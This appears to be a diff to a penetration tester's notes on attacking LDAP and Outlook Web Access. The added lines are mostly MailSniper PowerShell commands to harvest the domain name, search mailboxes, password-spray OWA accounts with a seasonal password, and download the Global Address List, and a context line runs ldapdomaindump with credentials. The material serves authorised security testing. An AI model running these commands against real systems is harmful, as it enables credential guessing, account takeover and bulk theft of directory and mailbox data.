@@ -1,5 +1,9 @@
 LDAP-OWA
 
+
+Lightweight Directory Access Protocol
+Leverages Kerberos v5 for authentication.
+
 ip=10.0.0.10
 echo $ip
 
@@ -33,12 +37,20 @@ ldapdomaindump -u domain\\username -p password --no-json --no-grep ldaps://ip$:p
 
 # MailSniper
 
-Invoke-SelfSearch -Mailbox joe.smith@target.com -Remote
-Invoke-SelfSearch -Mailbox joe.smith@target.com -ExchHostname webmail.target.com
+- Import the module.
+PS C:\> ipmo C:\Tools\MailSniper\MailSniper.ps1
 
-GetGlobalAddressList -UserName domain\username -Password Fall2021! -ExchHostname webmail.target.com/ews/exchange.asmx -OutFile GAL.txt
+- Enumerate the NetBIOS name of the target domain.
+PS C:\> Invoke-DomainHarvestOWA -ExchHostname <mail server IP>
 
-Invoke-PasswordSprayOWA -ExchHostname mail.target.com -UserList C:\users.txt -Password Fall2021! -OutFile creds.txt
+PS C:\> Invoke-SelfSearch -Mailbox joe.smith@target.com -Remote
+PS C:\> Invoke-SelfSearch -Mailbox joe.smith@target.com -ExchHostname webmail.target.com
+
+- Perform a password spray.
+PS C:\> Invoke-PasswordSprayOWA -ExchHostname mail.target.com -UserList C:\users.txt -Password Spring2022! -OutFile creds.txt
+
+- Download the GAL.
+PS C:\> GetGlobalAddressList -UserName domain\username -Password Spring2022! -ExchHostname webmail.target.com/ews/exchange.asmx -OutFile gal.txt
 ---------------------------------------------------------------------------------------------------------------------
 
 # Apache Directory Studio, using valid creds, port 636
